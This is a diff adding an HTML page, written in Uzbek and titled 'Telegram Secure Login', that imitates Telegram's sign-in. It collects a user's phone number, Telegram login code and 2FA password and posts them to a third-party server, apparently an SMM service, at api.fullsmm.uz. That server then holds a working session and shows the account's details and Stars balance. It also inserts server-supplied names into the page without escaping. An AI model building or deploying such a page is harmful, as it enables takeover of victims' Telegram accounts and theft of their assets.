@@ -1,0 +1,1060 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Telegram Secure Login</title>
+
+<style>
+:root{
+  --bg:#0e1621;
+  --card:#17212b;
+  --primary:#2aabee;
+  --text:#e9edef;
+  --muted:#8b9bb4;
+  --danger:#ff6b6b;
+  --success:#4ade80;
+  --radius:16px;
+}
+
+*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto, sans-serif; margin:0; padding:0;}
+
+body{
+  margin:0;
+  background:radial-gradient(circle at top,#1b2735,#0e1621);
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:var(--text);
+  padding:20px;
+}
+
+.card{
+  width:100%;
+  max-width:420px;
+  background:var(--card);
+  border-radius:var(--radius);
+  padding:28px;
+  box-shadow:0 30px 60px rgba(0,0,0,.45);
+  animation:fadeIn .5s ease;
+}
+
+@keyframes fadeIn{
+  from{opacity:0;transform:translateY(16px)}
+  to{opacity:1;transform:none}
+}
+
+.logo{
+  width:64px;height:64px;
+  border-radius:50%;
+  background:var(--primary);
+  margin:0 auto 16px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:30px;
+}
+
+h2{text-align:center;margin:6px 0}
+p{text-align:center;font-size:14px;color:var(--muted);margin-bottom:22px}
+
+.step{
+  animation:stepIn .35s ease;
+  display:none;
+}
+.step.active{
+  display:block;
+}
+@keyframes stepIn{
+  from{opacity:0;transform:translateX(20px)}
+  to{opacity:1;transform:none}
+}
+
+.input-group {
+  margin-top: 16px;
+}
+
+input,button{
+  width:100%;
+  padding:14px;
+  border-radius:var(--radius);
+  font-size:15px;
+}
+
+input{
+  background:#0e1621;
+  border:1px solid #22303c;
+  color:var(--text);
+  outline:none;
+  transition:border-color 0.3s;
+}
+
+input:focus{border-color:var(--primary)}
+
+/* Raqam input uchun maxsus stil */
+input[type="tel"]::-webkit-inner-spin-button,
+input[type="tel"]::-webkit-outer-spin-button,
+input.code-input::-webkit-inner-spin-button,
+input.code-input::-webkit-outer-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+
+input[type="tel"],
+input.code-input {
+  -moz-appearance: textfield;
+  appearance: textfield;
+}
+
+button{
+  background:var(--primary);
+  border:none;
+  color:white;
+  font-weight:500;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  transition:background .2s;
+  margin-top:16px;
+}
+
+button:hover:not(:disabled){background:#1f9fe0}
+button:disabled{opacity:.6;cursor:not-allowed}
+
+.msg{
+  text-align:center;
+  font-size:14px;
+  margin-top:12px;
+  min-height:20px;
+}
+.msg.error{color:var(--danger)}
+.msg.success{color:var(--success)}
+
+.spinner{
+  width:18px;height:18px;
+  border:2px solid rgba(255,255,255,.3);
+  border-top-color:white;
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.footer{
+  text-align:center;
+  font-size:12px;
+  color:var(--muted);
+  margin-top:24px;
+  padding-top:16px;
+  border-top:1px solid #22303c;
+}
+
+.back-btn {
+  background:transparent;
+  border:1px solid var(--muted);
+  color:var(--text);
+  margin-top:12px;
+}
+
+.back-btn:hover {
+  background:rgba(139, 155, 180, 0.1);
+}
+
+.code-input {
+  text-align: center;
+  font-size: 18px;
+  letter-spacing: 8px;
+  font-weight: bold;
+}
+
+.warning {
+  background: rgba(255, 107, 107, 0.1);
+  border: 1px solid var(--danger);
+  border-radius: var(--radius);
+  padding: 12px;
+  margin-bottom: 16px;
+  font-size: 13px;
+  color: var(--danger);
+}
+
+.warning.hidden {
+  display: none;
+}
+
+.api-status {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  background: var(--card);
+  padding: 8px 12px;
+  border-radius: var(--radius);
+  font-size: 12px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  box-shadow: 0 4px 12px rgba(0,0,0,.3);
+}
+
+.status-dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+}
+
+.status-dot.online {
+  background: var(--success);
+  animation: pulse 2s infinite;
+}
+
+.status-dot.offline {
+  background: var(--danger);
+}
+
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.5; }
+}
+
+.password-input {
+  margin-top: 12px;
+  animation: slideDown 0.3s ease;
+}
+
+@keyframes slideDown {
+  from {
+    opacity: 0;
+    transform: translateY(-10px);
+  }
+  to {
+    opacity: 1;
+    transform: none;
+  }
+}
+
+.info-banner {
+  background: rgba(42, 171, 238, 0.1);
+  border: 1px solid var(--primary);
+  border-radius: var(--radius);
+  padding: 12px;
+  margin-bottom: 16px;
+  font-size: 13px;
+  color: var(--primary);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.info-banner.hidden {
+  display: none;
+}
+
+/* User Profile Styles */
+.user-profile {
+  text-align: center;
+  animation: slideUp 0.5s ease;
+}
+
+@keyframes slideUp {
+  from {
+    opacity: 0;
+    transform: translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: none;
+  }
+}
+
+.user-avatar {
+  width: 100px;
+  height: 100px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, var(--primary), #1f9fe0);
+  margin: 0 auto 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 40px;
+  color: white;
+  border: 4px solid rgba(255, 255, 255, 0.1);
+}
+
+.user-name {
+  font-size: 24px;
+  font-weight: 600;
+  margin-bottom: 8px;
+}
+
+.user-phone {
+  color: var(--muted);
+  font-size: 16px;
+  margin-bottom: 24px;
+}
+
+.user-stats {
+  background: rgba(42, 171, 238, 0.05);
+  border-radius: var(--radius);
+  padding: 20px;
+  margin: 20px 0;
+  border: 1px solid rgba(42, 171, 238, 0.1);
+}
+
+.stat-item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 12px 0;
+  border-bottom: 1px solid rgba(139, 155, 180, 0.1);
+}
+
+.stat-item:last-child {
+  border-bottom: none;
+}
+
+.stat-label {
+  color: var(--muted);
+  font-size: 14px;
+}
+
+.stat-value {
+  font-size: 16px;
+  font-weight: 600;
+  color: var(--primary);
+}
+
+.stars-balance {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  font-size: 18px;
+  color: gold;
+  font-weight: 600;
+}
+
+.star-icon {
+  font-size: 20px;
+}
+
+.account-badge {
+  display: inline-block;
+  padding: 4px 12px;
+  border-radius: 20px;
+  font-size: 12px;
+  font-weight: 500;
+  margin-left: 8px;
+}
+
+.badge-premium {
+  background: linear-gradient(135deg, #fbb034, #ffdd00);
+  color: #000;
+}
+
+.badge-verified {
+  background: linear-gradient(135deg, #00b09b, #96c93d);
+  color: white;
+}
+
+.actions {
+  display: flex;
+  gap: 12px;
+  margin-top: 24px;
+}
+
+.action-btn {
+  flex: 1;
+  padding: 12px;
+  border-radius: var(--radius);
+  background: rgba(42, 171, 238, 0.1);
+  border: 1px solid rgba(42, 171, 238, 0.2);
+  color: var(--primary);
+  cursor: pointer;
+  transition: all 0.3s;
+  font-size: 14px;
+}
+
+.action-btn:hover {
+  background: rgba(42, 171, 238, 0.2);
+  transform: translateY(-2px);
+}
+
+.logout-btn {
+  background: rgba(255, 107, 107, 0.1);
+  border: 1px solid rgba(255, 107, 107, 0.2);
+  color: var(--danger);
+}
+
+.logout-btn:hover {
+  background: rgba(255, 107, 107, 0.2);
+}
+
+.loading-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 0;
+}
+
+.loading-text {
+  margin-top: 16px;
+  color: var(--muted);
+  font-size: 14px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <!-- LOGIN STEPS -->
+  <div id="loginContainer">
+    <div class="logo">✈️</div>
+    <h2>Telegram orqali kirish</h2>
+    <p id="desc">Xavfsiz autentifikatsiya</p>
+    
+    <!-- SHARE CONTACT -->
+    <div id="tgStep" class="step">
+      <button onclick="shareContact()">📞 Telefon raqamni ulashish</button>
+      <button class="back-btn" onclick="showManualStep()">Boshqa usul</button>
+    </div>
+
+    <!-- MANUAL PHONE -->
+    <div id="manualStep" class="step">
+      <div class="input-group">
+        <input id="phone" placeholder="+998901234567" type="tel" inputmode="tel">
+      </div>
+      <button id="sendCodeBtn" onclick="sendCode()">Kod yuborish</button>
+      <button class="back-btn" onclick="showTgStep()">Orqaga</button>
+    </div>
+
+    <!-- CODE -->
+    <div id="codeStep" class="step">
+      <div class="info-banner" id="infoBanner" style="display: none;">
+        🔐 Hisobingizda 2FA yoqilgan. Iltimos, parolingizni kiriting.
+      </div>
+      
+      <div class="input-group">
+        <input id="code" placeholder="Telegram kodi" maxlength="5" type="text" inputmode="numeric" class="code-input">
+        <div id="passwordContainer" class="password-input" style="display: none;">
+          <input id="password" placeholder="2FA parol (majburiy)" type="password">
+        </div>
+      </div>
+      <button id="verifyBtn" onclick="verify()">Tasdiqlash</button>
+      <button class="back-btn" onclick="showManualStep()">Raqamni o'zgartirish</button>
+    </div>
+
+    <div id="msg" class="msg"></div>
+    <div class="footer">Telegram Mini App • FullSMM API</div>
+  </div>
+
+  <!-- USER PROFILE (after login) -->
+  <div id="profileContainer" class="step" style="display: none;">
+    <div class="user-profile" id="userProfileContent">
+      <!-- Content will be loaded here -->
+    </div>
+  </div>
+</div>
+
+<!-- API Status Indicator -->
+<div id="apiStatus" class="api-status hidden">
+  <div class="status-dot"></div>
+  <span id="apiStatusText"></span>
+</div>
+
+<script>
+// API endpoint - FullSMM API
+const API_BASE = "https://api.fullsmm.uz";
+const API = API_BASE + "/auth";
+let PHONE = null;
+let requires2FA = false;
+let sessionData = null;
+
+const tgStep = document.getElementById("tgStep");
+const manualStep = document.getElementById("manualStep");
+const codeStep = document.getElementById("codeStep");
+const phoneInput = document.getElementById("phone");
+const codeInput = document.getElementById("code");
+const passwordInput = document.getElementById("password");
+const passwordContainer = document.getElementById("passwordContainer");
+const infoBanner = document.getElementById("infoBanner");
+const msgEl = document.getElementById("msg");
+const desc = document.getElementById("desc");
+const verifyBtn = document.getElementById("verifyBtn");
+const sendCodeBtn = document.getElementById("sendCodeBtn");
+const apiStatus = document.getElementById("apiStatus");
+const apiStatusText = document.getElementById("apiStatusText");
+const statusDot = apiStatus.querySelector('.status-dot');
+
+// Profile elements
+const loginContainer = document.getElementById("loginContainer");
+const profileContainer = document.getElementById("profileContainer");
+const userProfileContent = document.getElementById("userProfileContent");
+
+/* ====== ENV DETECTION ====== */
+document.addEventListener("DOMContentLoaded", async () => {
+  // API mavjudligini tekshirish
+  await checkAPI();
+  
+  // Agar oldin kirilgan bo'lsa, profile sahifasini ko'rsatish
+  const savedPhone = localStorage.getItem('loggedInPhone');
+  if (savedPhone) {
+    PHONE = savedPhone;
+    await showUserProfile();
+  } else if (window.Telegram && Telegram.WebApp) {
+    Telegram.WebApp.ready();
+    Telegram.WebApp.expand();
+    showTgStep();
+  } else {
+    showManualStep();
+  }
+});
+
+/* ====== API CHECK ====== */
+async function checkAPI() {
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 5000);
+    
+    const response = await fetch(`${API_BASE}/`, {
+      method: 'GET',
+      signal: controller.signal,
+      headers: { 
+        'Accept': 'application/json'
+      }
+    });
+    
+    clearTimeout(timeoutId);
+    
+    if (response.ok) {
+      updateApiStatus('online', 'API ulandi');
+    } else {
+      throw new Error(`API ${response.status} xatosi`);
+    }
+  } catch (error) {
+    console.warn('API mavjud emas:', error.message);
+    updateApiStatus('offline', 'API ulanmadi');
+    showMessage("API serverga ulanmadi. Iltimos, keyinroq urinib ko'ring.", "error");
+  }
+}
+
+function updateApiStatus(status, message) {
+  apiStatus.classList.remove('hidden');
+  apiStatusText.textContent = message;
+  statusDot.className = 'status-dot ' + status;
+}
+
+/* ====== STEP MANAGEMENT ====== */
+function showTgStep() {
+  hideAllSteps();
+  tgStep.classList.add('active');
+  desc.textContent = "Xavfsiz autentifikatsiya";
+  clearMessage();
+  PHONE = null;
+  requires2FA = false;
+  sessionData = null;
+  hidePasswordField();
+}
+
+function showManualStep() {
+  hideAllSteps();
+  manualStep.classList.add('active');
+  desc.textContent = "Telefon raqamingizni kiriting";
+  clearMessage();
+  phoneInput.focus();
+  phoneInput.value = "";
+  requires2FA = false;
+  sessionData = null;
+  hidePasswordField();
+}
+
+function showCodeStep() {
+  hideAllSteps();
+  codeStep.classList.add('active');
+  desc.textContent = "Telegram'dan kelgan kodni kiriting";
+  clearMessage();
+  codeInput.value = "";
+  codeInput.focus();
+  hidePasswordField();
+}
+
+function hideAllSteps() {
+  tgStep.classList.remove('active');
+  manualStep.classList.remove('active');
+  codeStep.classList.remove('active');
+}
+
+function showPasswordField() {
+  requires2FA = true;
+  passwordContainer.style.display = 'block';
+  infoBanner.style.display = 'flex';
+  desc.textContent = "2FA parolni kiriting";
+  passwordInput.focus();
+}
+
+function hidePasswordField() {
+  requires2FA = false;
+  passwordContainer.style.display = 'none';
+  infoBanner.style.display = 'none';
+  passwordInput.value = "";
+}
+
+/* ====== USER PROFILE ====== */
+async function showUserProfile() {
+  loginContainer.style.display = 'none';
+  profileContainer.style.display = 'block';
+  
+  // Loading ko'rsatish
+  userProfileContent.innerHTML = `
+    <div class="loading-container">
+      <div class="spinner" style="width: 32px; height: 32px;"></div>
+      <div class="loading-text">Foydalanuvchi ma'lumotlari yuklanmoqda...</div>
+    </div>
+  `;
+  
+  // API dan foydalanuvchi ma'lumotlarini olish
+  await fetchUserData();
+}
+
+async function fetchUserData() {
+  if (!PHONE) {
+    showMessage("Telefon raqam mavjud emas", "error");
+    logout();
+    return;
+  }
+  
+  try {
+    // Telefon raqamni encode qilish
+    const encodedPhone = encodeURIComponent(PHONE);
+    
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+    
+    const response = await fetch(`${API_BASE}/accounts/${encodedPhone}/statistics`, {
+      method: 'GET',
+      signal: controller.signal,
+      headers: { 
+        'Accept': 'application/json'
+      }
+    });
+    
+    clearTimeout(timeoutId);
+    
+    if (!response.ok) {
+      throw new Error(`API ${response.status} xatosi`);
+    }
+    
+    const data = await response.json();
+    
+    if (data.status === "ok" && data.data && data.data.account) {
+      renderUserProfile(data.data);
+      updateApiStatus('online', 'Ma\'lumotlar yuklandi');
+    } else {
+      throw new Error("Foydalanuvchi ma'lumotlari olinmadi");
+    }
+    
+  } catch (error) {
+    console.error("Foydalanuvchi ma'lumotlarini olishda xato:", error);
+    
+    // Xato xabarini ko'rsatish
+    userProfileContent.innerHTML = `
+      <div class="user-profile">
+        <div class="warning">
+          ⚠️ Foydalanuvchi ma'lumotlari yuklanmadi: ${error.message}
+        </div>
+        <div style="margin-top: 24px;">
+          <button class="action-btn" onclick="fetchUserData()">Qayta urinish</button>
+          <button class="action-btn logout-btn" onclick="logout()">Chiqish</button>
+        </div>
+      </div>
+    `;
+    
+    updateApiStatus('offline', 'Ma\'lumotlar yuklanmadi');
+  }
+}
+
+function renderUserProfile(data) {
+  const account = data.account;
+  const now = new Date();
+  const loginTime = now.toLocaleTimeString('uz-UZ');
+  
+  // Avatar uchun birinchi harf
+  let firstChar = 'T';
+  if (account.username) {
+    firstChar = account.username.charAt(0).toUpperCase();
+  } else if (account.phone) {
+    firstChar = account.phone.slice(-1);
+  }
+  
+  // Badges HTML
+  let badgesHTML = '';
+  if (account.is_premium) {
+    badgesHTML += `<span class="account-badge badge-premium">PREMIUM</span>`;
+  }
+  if (account.is_verified) {
+    badgesHTML += `<span class="account-badge badge-verified">VERIFIED</span>`;
+  }
+  
+  const profileHTML = `
+    <div class="user-avatar">${firstChar}</div>
+    <div class="user-name">
+      ${account.username || `User ${account.user_id}`}
+      ${badgesHTML}
+    </div>
+    <div class="user-phone">${account.phone || PHONE || 'Noma\'lum'}</div>
+    
+    <div class="user-stats">
+      <div class="stat-item">
+        <span class="stat-label">Telefon raqam:</span>
+        <span class="stat-value">${account.phone || PHONE || 'Noma\'lum'}</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">Foydalanuvchi ID:</span>
+        <span class="stat-value">${account.user_id || 'Noma\'lum'}</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">Username:</span>
+        <span class="stat-value">${account.username || 'Yo\'q'}</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">Premium:</span>
+        <span class="stat-value" style="color: ${account.is_premium ? 'gold' : 'var(--muted)'}">
+          ${account.is_premium ? '✅ Ha' : '❌ Yo\'q'}
+        </span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">Tasdiqlangan:</span>
+        <span class="stat-value" style="color: ${account.is_verified ? 'var(--success)' : 'var(--muted)'}">
+          ${account.is_verified ? '✅ Ha' : '❌ Yo\'q'}
+        </span>
+      </div>
+    </div>
+    
+    <div class="stars-balance">
+      <span class="star-icon">⭐</span>
+      <span>${account.stars_balance || 0}</span> Stars
+    </div>
+    
+    <div class="actions">
+      <button class="action-btn" onclick="fetchUserData()">🔄 Yangilash</button>
+      <button class="action-btn logout-btn" onclick="logout()">🚪 Chiqish</button>
+    </div>
+    
+    <div class="footer" style="margin-top: 24px;">
+      Muvaffaqiyatli kirildi • ${loginTime}
+    </div>
+  `;
+  
+  userProfileContent.innerHTML = profileHTML;
+}
+
+function logout() {
+  // LocalStorage dan o'chirish
+  localStorage.removeItem('loggedInPhone');
+  
+  // O'zgaruvchilarni tozalash
+  PHONE = null;
+  sessionData = null;
+  
+  // Login sahifasiga qaytish
+  profileContainer.style.display = 'none';
+  loginContainer.style.display = 'block';
+  showManualStep();
+  
+  showMessage("Chiqish muvaffaqiyatli", "success");
+}
+
+/* ====== UI HELPERS ====== */
+function showMessage(text, type = "success") {
+  msgEl.textContent = text;
+  msgEl.className = "msg " + type;
+}
+
+function clearMessage() {
+  msgEl.textContent = "";
+  msgEl.className = "msg";
+}
+
+function setLoading(btn, state, text = "Tekshirilmoqda...") {
+  if (!btn) return;
+  
+  btn.disabled = state;
+  btn.innerHTML = state
+    ? `<div class="spinner"></div> ${text}`
+    : btn.getAttribute('data-original-text') || "Tasdiqlash";
+}
+
+// Save original button texts
+document.querySelectorAll('button').forEach(btn => {
+  btn.setAttribute('data-original-text', btn.textContent);
+});
+
+/* ====== INPUT VALIDATION ====== */
+codeInput.addEventListener('input', function(e) {
+  this.value = this.value.replace(/[^0-9]/g, '');
+  
+  if (this.value.length > 5) {
+    this.value = this.value.substring(0, 5);
+  }
+  
+  if (this.value.length === 5) {
+    if (requires2FA) {
+      passwordInput.focus();
+    }
+  }
+});
+
+phoneInput.addEventListener('input', function(e) {
+  let value = this.value;
+  
+  if (value && !value.startsWith('+')) {
+    value = '+' + value.replace(/[^0-9]/g, '');
+  } else if (value.length > 1) {
+    const plus = value[0];
+    const numbers = value.substring(1).replace(/[^0-9]/g, '');
+    value = plus + numbers;
+  }
+  
+  this.value = value;
+});
+
+/* ====== SHARE CONTACT ====== */
+function shareContact() {
+  if (!Telegram?.WebApp) {
+    showMessage("Telegram WebApp muhiti topilmadi", "error");
+    showManualStep();
+    return;
+  }
+  
+  Telegram.WebApp.requestContact((res) => {
+    if (res?.phone_number) {
+      PHONE = res.phone_number;
+      sendCode();
+    } else {
+      showMessage("Telefon raqam olinmadi", "error");
+    }
+  });
+}
+
+/* ====== SEND CODE ====== */
+async function sendCode() {
+  if (!PHONE) {
+    PHONE = phoneInput.value.trim();
+    if (!PHONE) {
+      showMessage("Telefon raqamni kiriting", "error");
+      phoneInput.focus();
+      return;
+    }
+    
+    if (!PHONE.startsWith('+')) {
+      PHONE = '+' + PHONE;
+    }
+    
+    if (PHONE.length < 10) {
+      showMessage("Telefon raqam noto'g'ri formatda", "error");
+      return;
+    }
+  }
+  
+  showMessage("Kod yuborilmoqda...");
+  setLoading(sendCodeBtn, true, "Kod yuborilmoqda...");
+  
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+    
+    const response = await fetch(`${API}/send-code`, {
+      method: "POST",
+      signal: controller.signal,
+      headers: { 
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify({ phone: PHONE })
+    });
+    
+    clearTimeout(timeoutId);
+    
+    // Avval response statusni tekshirish
+    if (!response.ok) {
+      const contentType = response.headers.get('content-type');
+      let errorMessage = "Kod yuborilmadi";
+      
+      if (contentType && contentType.includes('application/json')) {
+        const errorData = await response.json();
+        errorMessage = errorData.detail || errorData.message || errorData.error || errorMessage;
+      } else {
+        const errorText = await response.text();
+        errorMessage = errorText || errorMessage;
+      }
+      
+      throw new Error(errorMessage);
+    }
+    
+    // JSON responseni o'qish
+    const data = await response.json();
+    
+    if (data.status === "error" || data.success === false || data.error) {
+      throw new Error(data.detail || data.error || data.message || "Kod yuborilmadi");
+    }
+    
+    showCodeStep();
+    showMessage("Kod yuborildi. Telegram'dan kelgan kodni kiriting.", "success");
+    updateApiStatus('online', 'Kod yuborildi');
+    
+  } catch (error) {
+    console.error("Kod yuborishda xato:", error);
+    
+    if (error.name === 'TypeError' && error.message.includes('fetch') || error.name === 'AbortError') {
+      updateApiStatus('offline', 'API javob bermadi');
+      showMessage("Internet ulanmadi yoki API javob bermadi. Iltimos, keyinroq urinib ko'ring.", "error");
+    } else {
+      showMessage(error.message, "error");
+    }
+  } finally {
+    setLoading(sendCodeBtn, false);
+  }
+}
+
+/* ====== VERIFY CODE / 2FA ====== */
+async function verify() {
+  const code = codeInput.value.trim();
+  const password = passwordInput.value.trim();
+  
+  if (!code) {
+    showMessage("Kodni kiriting", "error");
+    codeInput.focus();
+    return;
+  }
+  
+  if (code.length !== 5) {
+    showMessage("Kod 5 ta raqamdan iborat bo'lishi kerak", "error");
+    codeInput.focus();
+    return;
+  }
+  
+  // Agar 2FA kerak bo'lsa va parol kiritilmagan bo'lsa
+  if (requires2FA && !password) {
+    showMessage("2FA parolni kiriting", "error");
+    passwordInput.focus();
+    return;
+  }
+  
+  setLoading(verifyBtn, true, "Tasdiqlanmoqda...");
+  
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+    
+    // Request body
+    const requestBody = {
+      phone: PHONE,
+      code: code
+    };
+    
+    // Agar 2FA parol bo'lsa, qo'shamiz
+    if (requires2FA && password) {
+      requestBody.password = password;
+    }
+    
+    // Agar session ma'lumotlari bo'lsa, ularni ham qo'shamiz
+    if (sessionData) {
+      Object.assign(requestBody, sessionData);
+    }
+    
+    const response = await fetch(`${API}/verify-code`, {
+      method: "POST",
+      signal: controller.signal,
+      headers: { 
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify(requestBody)
+    });
+    
+    clearTimeout(timeoutId);
+    
+    // Response content typeni tekshirish
+    const contentType = response.headers.get('content-type');
+    if (!contentType || !contentType.includes('application/json')) {
+      const errorText = await response.text();
+      console.error('Non-JSON response:', errorText.substring(0, 100));
+      throw new Error("Serverdan noto'g'ri javob qaytdi");
+    }
+    
+    const data = await response.json();
+    console.log("Verify response:", data);
+    
+    // API har doim 200 qaytaryapti, shuning uchun data ichidagi statusni tekshirishimiz kerak
+    if (data.status === "error") {
+      // 2FA parol kerak degan xabarni tekshirish
+      if (data.detail && data.detail.includes("2FA parol kerak")) {
+        if (!requires2FA) {
+          // Birinchi marta 2FA so'rash
+          showPasswordField();
+          showMessage("2FA parolni kiriting", "error");
+          
+          // Session ma'lumotlarini saqlash (agar mavjud bo'lsa)
+          if (data.session) {
+            sessionData = { session: data.session };
+          }
+          
+          setLoading(verifyBtn, false);
+          return;
+        } else {
+          // 2FA parol noto'g'ri
+          throw new Error("Noto'g'ri 2FA parol");
+        }
+      }
+      
+      // Boshqa xatoliklar
+      throw new Error(data.detail || data.message || data.error || "Xatolik yuz berdi");
+    }
+    
+    // Muvaffaqiyatli kirish
+    // LocalStorage ga saqlash
+    localStorage.setItem('loggedInPhone', PHONE);
+    
+    // Profile sahifasini ko'rsatish
+    await showUserProfile();
+    showMessage("Muvaffaqiyatli kirish! 🎉", "success");
+    updateApiStatus('online', 'Kirish muvaffaqiyatli');
+    
+  } catch (error) {
+    console.error("Tasdiqlashda xato:", error);
+    
+    if (error.name === 'AbortError') {
+      showMessage("API javob bermadi. Iltimos, qayta urinib ko'ring.", "error");
+      updateApiStatus('offline', 'API javob bermadi');
+    } else {
+      showMessage(error.message, "error");
+      
+      // Agar 2FA parol noto'g'ri bo'lsa, parolni tozalash
+      if (error.message.includes("Noto'g'ri 2FA parol")) {
+        passwordInput.value = "";
+        passwordInput.focus();
+      }
+    }
+  } finally {
+    setLoading(verifyBtn, false);
+  }
+}
+
+// Enter key support
+phoneInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') sendCode();
+});
+
+codeInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') verify();
+});
+
+passwordInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') verify();
+});
+</script>
+
+</body>
+</html>
